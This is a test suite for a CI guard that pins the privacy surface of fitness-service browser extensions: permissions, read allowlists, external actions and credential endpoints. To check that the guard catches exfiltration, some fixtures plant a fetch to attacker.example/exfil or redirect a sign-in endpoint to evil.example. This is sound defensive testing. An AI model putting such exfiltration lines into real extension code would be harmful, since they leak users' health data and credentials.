import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  discoverBridges,
  extractPatternAllowlist,
} from "./check-bridge-privacy-surface.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = dirname(HERE);
const SCRIPT_NAME = "check-bridge-privacy-surface.mjs";
const SCRIPT = join(HERE, SCRIPT_NAME);
const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");
const WHOOP_CONTENT = join(REPO, "packages/whoop-bridge/content.js");

const runGuard = () =>
  spawnSync("node", [SCRIPT], {
    cwd: REPO,
    encoding: "utf8",
  });

// Tracked files this suite rewrites in place, and the ONLY ones it may.
//
// `node --test` runs test files concurrently, so a sibling suite reading one
// of these can observe a torn write: check-bridge-popup-message-parity reads
// `packages/<bridge>/popup.js` at load time. That exposure predates this
// suite and is tracked in #1096.
//
// The list is SHRINK-ONLY while that issue is open — enforced below and by
// `withMutatedFile` itself, so a new in-place mutation fails immediately
// rather than adding flake nobody notices. `packages/*/background.js` is
// deliberately absent: check-bridge-core-parity reads those in full and
// asserts on the `BRIDGE_MANIFEST` literal, so mutating one in place would
// have grown the exposure. Those cases use `withTempRepo`.
const MUTATED_REAL_FILES = [GOLDEN, POPUP, WHOOP_POPUP, WHOOP_CONTENT];

// Apply `mutate` to `path`, hand the guard's result to `assertOn`, and always
// restore the file.
const withMutatedFile = (path, mutate, assertOn) => {
  assert.ok(
    MUTATED_REAL_FILES.includes(path),
    `${path} is not in MUTATED_REAL_FILES. In-place mutation of a tracked file races sibling suites (#1096); stage this case with withTempRepo instead.`
  );
  const original = readFileSync(path, "utf8");
  const tampered = mutate(original);
  assert.notEqual(tampered, original, `mutation anchor missing in ${path}`);
  writeFileSync(path, tampered);
  try {
    assertOn(runGuard());
  } finally {
    writeFileSync(path, original);
  }
};

// Run the guard against a throwaway repo root: a temp directory holding a
// copy of the script plus whatever `files` describes, keyed by repo-relative
// path. The guard derives its root from its own location, so this exercises
// the real entry point end to end.
//
// Structural cases must NOT be staged inside the real packages/ tree.
// `node --test` runs test files concurrently, and sibling suites enumerate
// `packages/*-bridge` (check-bridge-ci-coverage, check-bridge-locales-…) or
// read `packages/<bridge>/popup.js` (check-bridge-popup-message-parity) at
// load time — a fixture package or a briefly-deleted popup would fail them
// at random.
const withTempRepo = (files, assertOn) => {
  const root = mkdtempSync(join(tmpdir(), "kaiord-surface-repo-"));
  try {
    const script = join(root, "scripts", SCRIPT_NAME);
    mkdirSync(dirname(script), { recursive: true });
    writeFileSync(script, readFileSync(SCRIPT, "utf8"));
    for (const [relative, contents] of Object.entries(files)) {
      const path = join(root, relative);
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, contents);
    }
    assertOn(spawnSync("node", [script], { encoding: "utf8" }));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
};

// A throwaway bridge plus the golden that describes it EXACTLY, so any
// failure is attributable to the case under test rather than to unrelated
// drift. Used for every case that would otherwise rewrite a real
// `background.js` — check-bridge-core-parity reads those in full.
// `authDeclaration` defaults to an empty, readable one so cases about OTHER
// sections are not silently rewritten into auth-surface failures. Cases that
// are about the handshake pass their own — including `""` for "declares
// nothing at all".
const syntheticBridge = ({
  background,
  allowedPaths,
  externalActions = [],
  authDeclaration = "const AUTH_ENDPOINTS = [];\n",
  authEndpoints = [],
}) => ({
  "packages/acme-bridge/manifest.json": "{}",
  "packages/acme-bridge/background.js": `${background}${authDeclaration}`,
  "scripts/fixtures/bridge-privacy-surface.json": JSON.stringify({
    "acme-bridge": {
      manifest: {
        permissions: [],
        host_permissions: [],
        content_scripts_matches: [],
        externally_connectable_matches: [],
      },
      allowed_paths: allowedPaths,
      external_actions: externalActions,
      auth_endpoints: authEndpoints,
    },
  }),
});

const TWO_ENTRY_GOLDEN = [
  { method: "GET", pattern: "^\\/a$" },
  { method: "POST", pattern: "^\\/b$" },
];

// One `method:` and one `pattern:` per entry — an assumption the guard's
// extractor does not participate in. Requiring the two counts to agree also
// catches a half-written entry, which is the shape that used to vanish.
const countKeyedEntries = (bridge, body) => {
  const methods = body.match(/\bmethod:/g)?.length ?? 0;
  const patterns = body.match(/\bpattern:/g)?.length ?? 0;
  assert.equal(
    methods,
    patterns,
    `${bridge}: allowlist has ${methods} \`method:\` keys but ${patterns} \`pattern:\` keys — some entry is incomplete`
  );
  return methods;
};

// Prefix-shape entries are one quoted path per line.
const countQuotedPrefixLines = (body) =>
  body.split("\n").filter((line) => /^\s*"\/[^"]*",?\s*$/.test(line)).length;

describe("bridge privacy surface guard", () => {
  it("mutates no more tracked files than the debt already allows", () => {
    // Shrink-only while #1096 is open. `node --test` runs test files
    // concurrently and sibling suites read these paths — popup.js by
    // check-bridge-popup-message-parity — so every entry here is a torn-read
    // window. Growing the list grows the flake surface; withTempRepo does
    // not. background.js is deliberately absent: check-bridge-core-parity
    // reads it in full and asserts on the BRIDGE_MANIFEST literal.
    assert.equal(
      MUTATED_REAL_FILES.length,
      4,
      "in-place mutation of tracked files is shrink-only while #1096 is open"
    );
    for (const path of MUTATED_REAL_FILES) {
      assert.doesNotMatch(path, /background\.js$/);
    }
  });

  it("passes against the checked-in golden", () => {
    const result = runGuard();

    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /matches golden/);
  });

  it("fails when the manifest permissions drift from the golden", () => {
    const original = readFileSync(GOLDEN, "utf8");
    const tampered = JSON.parse(original);
    tampered["garmin-bridge"].manifest.permissions = [
      "storage",
      "tabs",
      "webRequest",
      "alarms",
    ];
    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
    } finally {
      writeFileSync(GOLDEN, original);
    }
  });

  it("fails on an absolute-URL fetch in popup.js", () => {
    withMutatedFile(
      POPUP,
      (src) =>
        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /absolute-URL fetch/);
      }
    );
  });

  it("fails when whoop's ALLOWED_PREFIXES gains an entry", () => {
    // whoop declares its read allowlist as a plain string array
    // (ALLOWED_PREFIXES), not the {method, pattern} shape. Until the
    // extractor learned that shape, whoop's allowed_paths was [] in the
    // golden and this widening produced zero CI failure — while the privacy
    // policy asserted the allowlist as a durable property.
    withMutatedFile(
      WHOOP_CONTENT,
      (src) =>
        src.replace(
          '"/health-service/v2/stress-bff",',
          '"/health-service/v2/stress-bff",\n  "/membership-service/v1/affiliate",'
        ),
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /membership-service/);
      }
    );
  });

  it("covers whoop-bridge popup.js for absolute-URL exfil", () => {
    withMutatedFile(
      WHOOP_POPUP,
      (src) =>
        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /absolute-URL fetch/);
        assert.match(result.stderr, /whoop-bridge/);
      }
    );
  });

  it("fails when a bridge declares a popup but ships no popup.js", () => {
    // The exfil scan reads popup.js. Skipping absent files quietly would
    // make deleting the file a way to delete the check.
    //
    // The golden here is the exact surface of this one bridge, so the
    // missing popup is the ONLY thing the guard can complain about.
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": JSON.stringify({
          action: { default_popup: "popup.html" },
        }),
        "scripts/fixtures/bridge-privacy-surface.json": JSON.stringify({
          "acme-bridge": {
            manifest: {
              permissions: [],
              host_permissions: [],
              content_scripts_matches: [],
              externally_connectable_matches: [],
            },
            allowed_paths: [],
            // No root .js at all: this package executes nothing, so it
            // reaches no endpoint and owes no declaration.
            external_actions: [],
            auth_endpoints: [],
          },
        }),
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /popup\.js is missing/);
        assert.match(result.stderr, /acme-bridge/);
        assert.doesNotMatch(result.stderr, /drifted from golden/);
      }
    );
  });

  it("verifies the script is executable directly", () => {
    // Smoke test that the import side-effect isn't broken.
    assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
  });

  // ---------- key order must not change what is extracted ----------
  //
  // `{ method, pattern }` and `{ pattern, method }` describe exactly the
  // same allowlist. An extractor that scans for `method:` and then searches
  // FORWARD for `pattern: /` pairs a method with the NEXT entry's pattern
  // once the keys are reversed, so entries silently vanish from the
  // extracted surface — and a vanished entry cannot drift from a golden
  // that never listed it. That is a widened read scope shipping green.

  it("pairs method with pattern in either key order", () => {
    const methodFirst = `const ALLOWED = [
  { method: "GET", pattern: /^\\/a$/ },
  { method: "POST", pattern: /^\\/b$/ },
];`;
    const patternFirst = `const ALLOWED = [
  { pattern: /^\\/a$/, method: "GET" },
  { pattern: /^\\/b$/, method: "POST" },
];`;
    const expected = [
      { method: "GET", pattern: "^\\/a$" },
      { method: "POST", pattern: "^\\/b$" },
    ];

    assert.deepEqual(extractPatternAllowlist(methodFirst), expected);
    assert.deepEqual(extractPatternAllowlist(patternFirst), expected);
  });

  it("still fails on a widened allowlist written with reversed keys", () => {
    // The end-to-end version of the case above, and the one that matters:
    // a scope the golden does not list, added with the keys reversed.
    // Before the object-literal split this exited 0 with "matches golden" —
    // same widening, same golden, different key order.
    withTempRepo(
      syntheticBridge({
        background:
          "const ALLOWED = [\n" +
          '  { pattern: /^\\/a$/, method: "GET" },\n' +
          '  { pattern: /^\\/userprofile-service\\/.*$/, method: "GET" },\n' +
          '  { pattern: /^\\/b$/, method: "POST" },\n' +
          "];\n",
        allowedPaths: TWO_ENTRY_GOLDEN,
      }),
      (result) => {
        assert.equal(
          result.status,
          1,
          `guard passed on a widened allowlist:\n${result.stdout}`
        );
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /userprofile-service/);
      }
    );
  });

  it("treats a pure key-order swap as no change at all", () => {
    // The complement of the test above: reversing the keys without touching
    // the scopes must leave the extracted surface byte-identical. A guard
    // that merely rejected anything unfamiliar would pass the widening test
    // for the wrong reason.
    withTempRepo(
      syntheticBridge({
        background:
          "const ALLOWED = [\n" +
          '  { pattern: /^\\/a$/, method: "GET" },\n' +
          '  { pattern: /^\\/b$/, method: "POST" },\n' +
          "];\n",
        allowedPaths: TWO_ENTRY_GOLDEN,
      }),
      (result) => {
        assert.equal(result.status, 0, result.stderr);
        assert.match(result.stdout, /matches golden/);
      }
    );
  });

  it("refuses to silently drop an entry it cannot read", () => {
    // An entry carrying a method and no pattern used to `continue`, i.e.
    // vanish from the surface without a word.
    assert.throws(
      () =>
        extractPatternAllowlist(`const ALLOWED = [
  { method: "GET" },
];`),
      /unreadable allowlist entry/
    );
  });

  // ---------- non-literal entries must not vanish either ----------
  //
  // The object split made key order irrelevant, but everything that is not
  // an object literal was still dropped without a word: the extractor
  // returned only the inline entries and the guard called that a match.
  // Fail-loud for a malformed literal and fail-silent for a spread is the
  // same disappearance one level up — and `discoverBridges` just widened
  // the door a new bridge arrives through.

  it("refuses a spread element instead of extracting only the inline entries", () => {
    assert.throws(
      () =>
        extractPatternAllowlist(
          'const ALLOWED = [...BASE_ALLOWED, { method: "GET", pattern: /^\\/inline$/ }];'
        ),
      /not an object literal[\s\S]*BASE_ALLOWED/
    );
  });

  it("refuses a shared-constant element", () => {
    assert.throws(
      () =>
        extractPatternAllowlist(
          'const ALLOWED = [SHARED_ENTRY, { method: "GET", pattern: /^\\/inline$/ }];'
        ),
      /not an object literal[\s\S]*SHARED_ENTRY/
    );
  });

  it("refuses entries appended after the literal with .concat()", () => {
    // Staged on a synthetic bridge so the `];` being rewritten is provably
    // the allowlist terminator. Replacing the first `];` of a real
    // background.js is not anchored to anything: if it ever lands on some
    // other array, the guard still fails — for an unrelated reason — and a
    // bare `assert.equal(status, 1)` would pass without `assertDeclaration-
    // EndsAtBracket` having been exercised at all. Hence the message check
    // below, not just the exit code.
    withTempRepo(
      syntheticBridge({
        background:
          "const ALLOWED = [\n" +
          '  { method: "GET", pattern: /^\\/a$/ },\n' +
          "].concat(EXTRA_READS);\n",
        allowedPaths: TWO_ENTRY_GOLDEN,
      }),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /does not end at its/);
        assert.match(result.stderr, /concat\(EXTRA_READS\)/);
        assert.doesNotMatch(result.stderr, /drifted from golden/);
      }
    );
  });

  it("does not let a nested object shadow the entry's own pattern", () => {
    // `{ alt: { pattern: /^\/DECOY$/ }, method, pattern }` recorded the
    // decoy: the tokenizer split by depth correctly, but the key search ran
    // over the FLATTENED text and took the first match at any depth.
    assert.throws(
      () =>
        extractPatternAllowlist(
          'const ALLOWED = [{ alt: { pattern: /^\\/DECOY$/ }, method: "GET", pattern: /^\\/real$/ }];'
        ),
      /field `alt` has a value this guard cannot read/
    );
  });

  it("refuses an entry carrying a field it does not understand", () => {
    assert.throws(
      () =>
        extractPatternAllowlist(
          'const ALLOWED = [{ method: "GET", pattern: /^\\/a$/, note: "why" }];'
        ),
      /unrecognised field\(s\) `note`/
    );
  });

  // ---------- not finding the list is not the same as no list ----------
  //
  // Both declarations are located by literal text, so a wrapper or a rename
  // made the whole allowlist vanish with `allowed_paths: []` in the golden.
  // Residue and terminator checks never fired — nothing matched to run them
  // on. On an existing bridge that reads as entries leaving the golden; on a
  // NEW one, which the on-disk bridge list now adopts by itself, there is no
  // "before": `[]` is written once and reads as "this bridge reads nothing".

  it("refuses a wrapped allowlist declaration instead of recording an empty surface", () => {
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": "{}",
        "packages/acme-bridge/background.js":
          'const ALLOWED = Object.freeze([{ method: "GET", pattern: /^\\/secret$/ }]);\n',
        "scripts/fixtures/bridge-privacy-surface.json": "{}",
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /declares no readable allowlist/);
        assert.doesNotMatch(result.stdout, /matches golden/);
      }
    );
  });

  it("refuses a renamed allowlist declaration", () => {
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": "{}",
        "packages/acme-bridge/background.js":
          'const ALLOWED_LIST = [{ method: "GET", pattern: /^\\/secret$/ }];\n',
        "scripts/fixtures/bridge-privacy-surface.json": "{}",
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /declares no readable allowlist/);
      }
    );
  });

  it("still reads a properly declared allowlist in a fresh bridge", () => {
    // The complement: the two refusals above must come from not finding the
    // declaration, not from refusing every new bridge on sight.
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": "{}",
        "packages/acme-bridge/background.js":
          'const ALLOWED = [{ method: "GET", pattern: /^\\/ok$/ }];\n' +
          "const AUTH_ENDPOINTS = [];\n",
        "scripts/fixtures/bridge-privacy-surface.json": "{}",
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /\^\\\\\/ok\$/);
        assert.doesNotMatch(result.stderr, /declares no readable allowlist/);
      }
    );
  });

  it("keeps braces and brackets inside a regex out of the object split", () => {
    // `\\d{4}` and `[^\\/]+` carry the same characters the splitter uses as
    // structure, and both appear in the real allowlists.
    const body = `const ALLOWED = [
  // a comment mentioning { braces } and "quotes"
  {
    method: "GET",
    pattern: /^\\/plan\\/\\d{4}-\\d{2}-\\d{2}\\/[^\\/]+$/,
  },
];`;

    assert.deepEqual(extractPatternAllowlist(body), [
      { method: "GET", pattern: "^\\/plan\\/\\d{4}-\\d{2}-\\d{2}\\/[^\\/]+$" },
    ]);
  });

  // ---------- the external command surface is in the golden ----------
  //
  // `EXTERNAL_ACTIONS` is what kaiord.com may ask an installed extension to
  // do across origins. It was absent from the golden, so widening it was
  // invisible to this guard AND to `pnpm test:scripts`: only the per-bridge
  // vitest suites held the line, and only three of the five pinned the
  // exact set. Adding a bogus action to garmin (published) and to whoop
  // passed the guard, all 733 script tests, and both bridges' own suites.

  const ONE_ENTRY_GOLDEN = [{ method: "GET", pattern: "^\\/a$" }];
  const withActions = (actions) =>
    'const ALLOWED = [{ method: "GET", pattern: /^\\/a$/ }];\n' +
    `const EXTERNAL_ACTIONS = new Set([${actions
      .map((a) => `"${a}"`)
      .join(", ")}]);\n`;

  it("fails when a bridge gains an external action", () => {
    withTempRepo(
      syntheticBridge({
        background: withActions(["ping", "exfiltrate-everything"]),
        allowedPaths: ONE_ENTRY_GOLDEN,
        externalActions: ["ping"],
      }),
      (result) => {
        assert.equal(
          result.status,
          1,
          `guard passed on a widened external surface:\n${result.stdout}`
        );
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /exfiltrate-everything/);
      }
    );
  });

  it("fails when a bridge loses an external action", () => {
    // Narrowing is drift too: the golden records what the surface IS, so
    // shrinking it is a deliberate act that has to be re-recorded.
    withTempRepo(
      syntheticBridge({
        background: withActions(["ping", "status"]),
        allowedPaths: ONE_ENTRY_GOLDEN,
        externalActions: ["ping", "status", "whoop-fetch"],
      }),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /whoop-fetch/);
      }
    );
  });

  it("refuses to silently record an empty external surface it could not read", () => {
    // A declaration the extractor cannot parse must not read as "this
    // bridge exposes nothing" — that is the same vanishing failure as a
    // dropped allowlist entry, applied to the command surface.
    withTempRepo(
      syntheticBridge({
        background:
          'const ALLOWED = [{ method: "GET", pattern: /^\\/a$/ }];\n' +
          'const EXTERNAL_ACTIONS = buildActionSet(["ping", "status"]);\n',
        allowedPaths: ONE_ENTRY_GOLDEN,
        externalActions: ["ping", "status"],
      }),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /EXTERNAL_ACTIONS/);
        assert.match(
          result.stderr,
          /could not be read|no `const EXTERNAL_ACTIONS/
        );
      }
    );
  });

  it("golden external_actions match each bridge's source Set, counted independently", () => {
    // Derived without the guard's extractor, for the same reason the
    // allowed_paths count is: a cross-check that calls the code it is
    // checking agrees with that code's mistakes.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    for (const bridge of Object.keys(golden)) {
      const path = join(REPO, "packages", bridge, "background.js");
      if (!existsSync(path)) {
        assert.deepEqual(golden[bridge].external_actions, []);
        continue;
      }
      const src = readFileSync(path, "utf8");
      const start = src.indexOf("const EXTERNAL_ACTIONS = new Set([");
      assert.ok(start >= 0, `${bridge}: no EXTERNAL_ACTIONS Set declaration`);
      const end = src.indexOf("])", start);
      assert.ok(end >= 0, `${bridge}: EXTERNAL_ACTIONS Set is not closed`);
      const declared = [...src.slice(start, end).matchAll(/"([^"\n]+)"/g)].map(
        (m) => m[1]
      );

      assert.ok(
        declared.length > 0,
        `${bridge}: counted 0 external actions — this assertion would pass vacuously`
      );
      assert.deepEqual(
        golden[bridge].external_actions,
        declared,
        `${bridge}: golden external_actions differ from background.js`
      );
    }
  });

  // ---------- the credential-handshake surface ----------
  //
  // `allowed_paths` locks the DATA-call surface, gated by each bridge's
  // `isAllowed`. A bridge's own handshake bypasses that gate by
  // construction, and those endpoints are where the credentials travel.
  // garmin's three hops call `fetchImpl` directly; trainingpeaks' token
  // exchange calls `cookieSessionFetch` directly and reached the golden only
  // because `/users/v3/token` ALSO sits in ALLOWED for the editor's session
  // probe — a coincidence that would evaporate with that entry.
  //
  // Every case below stages its bridge with withTempRepo: garmin-oauth.js
  // and tp-auth.js are not in MUTATED_REAL_FILES and that list is
  // shrink-only.

  const authBridge = (body, endpoints = []) =>
    syntheticBridge({
      background: 'const ALLOWED = [{ method: "GET", pattern: /^\\/ok$/ }];\n',
      allowedPaths: [{ method: "GET", pattern: "^\\/ok$" }],
      authDeclaration: body,
      authEndpoints: endpoints,
    });

  // Every refusal below must come from the specific defect it stages, not
  // from an unrelated check firing first. These are the other checks'
  // signatures.
  const assertOnlyAuthFailure = (result) => {
    assert.doesNotMatch(result.stderr, /absolute-URL fetch/);
    assert.doesNotMatch(result.stderr, /declares no readable allowlist/);
    assert.doesNotMatch(result.stdout, /matches golden/);
  };

  it("records each bridge's handshake endpoints, cross-counted from source", () => {
    // Derived WITHOUT the guard's extractor, like the allowed_paths and
    // external_actions cross-checks: a counter that calls the code it checks
    // agrees with that code's mistakes.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));

    // The exact per-bridge sets, pinned. An extractor that under-reported
    // would still satisfy a "shape" assertion; only the literal sets catch
    // one of garmin's three going missing.
    assert.deepEqual(golden["garmin-bridge"].auth_endpoints, [
      "https://sso.garmin.com/sso/signin",
      "https://connectapi.garmin.com/oauth-service/oauth/preauthorized",
      "https://connectapi.garmin.com/oauth-service/oauth/exchange/user/2.0",
    ]);
    assert.deepEqual(golden["trainingpeaks-bridge"].auth_endpoints, [
      "https://tpapi.trainingpeaks.com/users/v3/token",
    ]);
    for (const bridge of ["tanita-bridge", "train2go-bridge", "whoop-bridge"]) {
      assert.deepEqual(
        golden[bridge].auth_endpoints,
        [],
        `${bridge} rides its session cookie and mints nothing; a non-empty set here means it grew a handshake`
      );
    }

    // And every bridge's golden entry equals what its source declares,
    // counted here by hand.
    for (const bridge of Object.keys(golden)) {
      const dir = join(REPO, "packages", bridge);
      const declaring = readdirSync(dir)
        .filter((f) => f.endsWith(".js"))
        .sort()
        .map((f) => readFileSync(join(dir, f), "utf8"))
        .filter((src) => src.includes("const AUTH_ENDPOINTS = ["));
      assert.equal(
        declaring.length,
        1,
        `${bridge}: expected exactly one root .js to declare AUTH_ENDPOINTS, found ${declaring.length}`
      );
      const src = declaring[0];
      const start = src.indexOf("const AUTH_ENDPOINTS = [");
      const end = src.indexOf("]", start);
      const declared = [
        ...src.slice(start, end).matchAll(/"([^"\n]+)"/g),
      ].map((m) => m[1]);

      assert.deepEqual(
        golden[bridge].auth_endpoints,
        declared,
        `${bridge}: golden auth_endpoints differ from the source declaration`
      );
    }
  });

  it("fails when a declared handshake endpoint is changed", () => {
    // The point of recording them: the host receiving the credential moves,
    // the golden does not follow, CI says so.
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = ["https://evil.example/sso/signin"];\n',
        ["https://sso.garmin.com/sso/signin"]
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /evil\.example/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("fails when a declared handshake endpoint is dropped", () => {
    // The ratchet, guard half: deleting an entry moves the golden. The
    // other half — deleting it while the call REMAINS — is caught by each
    // bridge's own suite, which compares the declaration against the URLs
    // its handshake actually requests through the mocked fetch. Neither
    // half alone is enough: this one is satisfied by regenerating the
    // golden, that one by never declaring the endpoint in the first place.
    withTempRepo(
      authBridge('const AUTH_ENDPOINTS = ["https://a.example/one"];\n', [
        "https://a.example/one",
        "https://a.example/two",
      ]),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /a\.example\/two/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a template literal instead of recording placeholder text", () => {
    // `scanQuoted` treats a backtick like any quote, so
    // `` `${TPAPI}${TOKEN_PATH}` `` would reach the golden as the literal
    // string "${TPAPI}${TOKEN_PATH}" — text that pins no host, sitting in
    // the fixture looking exactly like a recorded endpoint. This is the
    // shape tp-auth.js would take if written the obvious way.
    withTempRepo(
      authBridge("const AUTH_ENDPOINTS = [`${TPAPI}${TOKEN_PATH}`];\n"),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /template literal/);
        assert.match(result.stderr, /\$\{TPAPI\}/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses an entry that pins no origin", () => {
    // A bare path would record WHAT is requested but not WHO receives the
    // credential, which is the entire privacy claim.
    withTempRepo(
      authBridge('const AUTH_ENDPOINTS = ["/users/v3/token"];\n'),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /not an absolute/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a spread instead of recording only the inline endpoints", () => {
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = [...BASE, "https://a.example/one"];\n'
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /not an object literal|BASE/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses endpoints appended after the literal", () => {
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = ["https://a.example/one"].concat(EXTRA);\n'
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /does not end at its/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses an object literal where a URL string belongs", () => {
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = [{ url: "https://a.example/one" }];\n'
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /object literal/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a wrapped declaration instead of recording an empty surface", () => {
    // Recording `[]` here is the precise failure: it reads as "this bridge
    // sends credentials nowhere" while the wrapped list is still live.
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = Object.freeze(["https://a.example/one"]);\n'
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /mention\(s\) AUTH_ENDPOINTS/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a near-miss rename instead of recording an empty surface", () => {
    // `AUTH_ENDPOINTS_LIST` still contains the name, so the mention path
    // catches it — the same path as the wrapped case.
    withTempRepo(
      authBridge('const AUTH_ENDPOINTS_LIST = ["https://a.example/one"];\n'),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /mention\(s\) AUTH_ENDPOINTS/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a full rename instead of recording an empty surface", () => {
    // `OAUTH_HOSTS` shares no substring with the declaration, so the
    // mention path CANNOT see it — this is the case the mention check does
    // not cover, and it is exactly why absence itself has to be refused.
    // Pinned separately because both renames must fail while failing for
    // different, stated reasons: asserting only the exit code would not
    // distinguish "the check I want fired" from "something else did".
    withTempRepo(
      authBridge('const OAUTH_HOSTS = ["https://a.example/one"];\n'),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /no `const AUTH_ENDPOINTS/);
        assert.doesNotMatch(result.stderr, /mention\(s\) AUTH_ENDPOINTS/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("refuses a bridge that declares no handshake surface at all", () => {
    // Absence is NOT read as "no handshake". Nothing tells this guard
    // whether a bridge has one, so silence would let a new
    // packages/foo-bridge that mints tokens lock `auth_endpoints: []` and
    // pass review as sending credentials nowhere. Deriving the bridge list
    // from disk buys nothing on its own — the new bridge gets enumerated
    // and still locks an empty surface. This is the rule that makes the
    // enumeration bite.
    withTempRepo(authBridge(""), (result) => {
      assert.equal(result.status, 1, result.stdout);
      assert.match(result.stderr, /no `const AUTH_ENDPOINTS/);
      assertOnlyAuthFailure(result);
    });
  });

  it("refuses a second declaration in the same file", () => {
    // `indexOf` finds the first; the rest would be invisible.
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = ["https://a.example/one"];\n' +
          'const AUTH_ENDPOINTS = ["https://b.example/two"];\n'
      ),
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /more than once/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("reads a handshake split across two files rather than the first only", () => {
    // Positive control for the multi-file path: garmin keeps its
    // declaration in garmin-oauth.js, not background.js, so the scan covers
    // every root .js. If it stopped at the first match, a handshake split
    // in two would be recorded at half its size — under-reporting that
    // looks complete.
    withTempRepo(
      {
        ...authBridge('const AUTH_ENDPOINTS = ["https://a.example/one"];\n', [
          "https://a.example/one",
          "https://z.example/two",
        ]),
        "packages/acme-bridge/z-auth.js":
          'const AUTH_ENDPOINTS = ["https://z.example/two"];\n',
      },
      (result) => {
        assert.equal(result.status, 0, result.stderr);
        assert.match(result.stdout, /matches golden/);
      }
    );
  });

  it("refuses a wrapped declaration in a SECOND file", () => {
    // garmin declares in garmin-oauth.js, not background.js. An extractor
    // that stopped once one file read cleanly would let a wrapped
    // declaration added to another file contribute nothing and say nothing —
    // the same vanishing as a single wrapped declaration, hidden behind a
    // sibling that happens to parse. Found by reading this extractor's own
    // early return, not by a failing test.
    withTempRepo(
      {
        ...authBridge('const AUTH_ENDPOINTS = ["https://a.example/one"];\n', [
          "https://a.example/one",
        ]),
        "packages/acme-bridge/z-auth.js":
          'const AUTH_ENDPOINTS = Object.freeze(["https://z.example/two"]);\n',
      },
      (result) => {
        assert.equal(
          result.status,
          1,
          `a wrapped second declaration was skipped in silence:\n${result.stdout}`
        );
        assert.match(result.stderr, /z-auth\.js/);
        assert.match(result.stderr, /mention\(s\) AUTH_ENDPOINTS/);
        assertOnlyAuthFailure(result);
      }
    );
  });

  it("accepts a correctly declared handshake surface", () => {
    // The complement of every refusal above: they must come from the defect
    // staged, not from refusing any declaration on sight.
    withTempRepo(
      authBridge(
        'const AUTH_ENDPOINTS = [\n  "https://a.example/one",\n  "https://b.example/two",\n];\n',
        ["https://a.example/one", "https://b.example/two"]
      ),
      (result) => {
        assert.equal(result.status, 0, result.stderr);
        assert.match(result.stdout, /matches golden/);
      }
    );
  });

